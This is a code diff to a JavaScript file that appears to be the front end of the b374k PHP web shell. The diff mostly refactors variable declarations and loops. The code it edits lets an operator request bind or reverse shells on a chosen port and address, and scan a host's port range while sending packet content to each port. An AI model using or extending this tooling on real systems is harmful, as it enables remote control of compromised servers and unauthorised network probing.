@@ -5,7 +5,7 @@ Zepto(function($){
 
 function rs_init(){
 	if(evalReady&&(evalSupported!=null)&&(evalSupported!='')){
-		splits = evalSupported.split(",");
+		var splits = evalSupported.split(",");
 		$.each(splits, function(i, k){
 			$('.rsType').append("<option>"+k+"</option>");
 		});
@@ -28,7 +28,8 @@ function rs_go_back(){
 }
 
 function rs_go(rsType){
-	rsArgs = "";
+	var rsArgs = "";
+	var rsPort,rsLang,rsResult;
 	if(rsType=='bind'){
 		rsPort = parseInt($('#bindPort').val());
 		rsLang = $('#bindLang').val();
@@ -36,7 +37,7 @@ function rs_go(rsType){
 		rsResult = $('#bindResult');
 	}
 	else if(rsType=='back'){
-		rsAddr = $('#backAddr').val();
+		var rsAddr = $('#backAddr').val();
 		rsPort = parseInt($('#backPort').val());
 		rsLang = $('#backLang').val();
 		rsArgs = rsPort + ' ' + rsAddr;
@@ -52,7 +53,7 @@ function rs_go(rsType){
 		send_post({ rsLang:rsLang, rsArgs:rsArgs },
 			function(res){
 				if(res!='error'){
-					splits = res.split('{[|b374k|]}');
+					var splits = res.split('{[|b374k|]}');
 					if(splits.length==2){
 						output = splits[0]+"<hr>"+splits[1];
 						rsResult.html(output);
@@ -67,15 +68,15 @@ function rs_go(rsType){
 }
 
 function packet_go(){
-	packetHost = $('#packetHost').val();
-	packetStartPort = parseInt($('#packetStartPort').val());
-	packetEndPort = parseInt($('#packetEndPort').val());
-	packetTimeout = parseInt($('#packetTimeout').val());
-	packetSTimeout = parseInt($('#packetSTimeout').val());
-	packetContent = $('#packetContent').val();
-	packetResult = $('#packetResult');
-	packetStatus = $('#packetStatus');
-	packetPortList = $('#packetPortList').val();
+	var packetHost = $('#packetHost').val();
+    var packetStartPort = parseInt($('#packetStartPort').val());
+    var packetEndPort = parseInt($('#packetEndPort').val());
+    var packetTimeout = parseInt($('#packetTimeout').val());
+    var packetSTimeout = parseInt($('#packetSTimeout').val());
+    var packetContent = $('#packetContent').val();
+    var packetResult = $('#packetResult');
+    // var packetStatus = $('#packetStatus');
+    var packetPortList = $('#packetPortList').val();
 
 	if((isNaN(packetStartPort))||(packetStartPort<=0)||(packetStartPort>65535)){
 		packetResult.html('Invalid start port');
@@ -95,6 +96,7 @@ function packet_go(){
 		return;
 	}
 
+	var start,end;
 	if(packetStartPort>packetEndPort){
 		start = packetEndPort;
 		end = packetStartPort;
@@ -122,14 +124,15 @@ function packet_go(){
 
 	packetPortList = distinct(packetPortList);
 	packetResult.html('');
-	for(var i in packetPortList) {
-		packetPort = packetPortList[i];
-		packet_send(packetHost, packetPort, packetEndPort, packetTimeout, packetSTimeout, packetContent, function(res) {
-			if(!res.startsWith('false')) {
-				packetResult.append(res);
-			}
-		});
-	}
+	packetPortList.forEach(function (packetPort) {
+        packet_send(packetHost, packetPort, packetEndPort, packetTimeout, packetSTimeout, packetContent, function (res) {
+            if (!res.startsWith('false')) {
+                packetResult.append(res);
+            } else {
+                output(res);
+            }
+        });
+    });
 }
 
 function packet_send(packetHost, packetPort, packetEndPort, packetTimeout, packetSTimeout, packetContent, func){
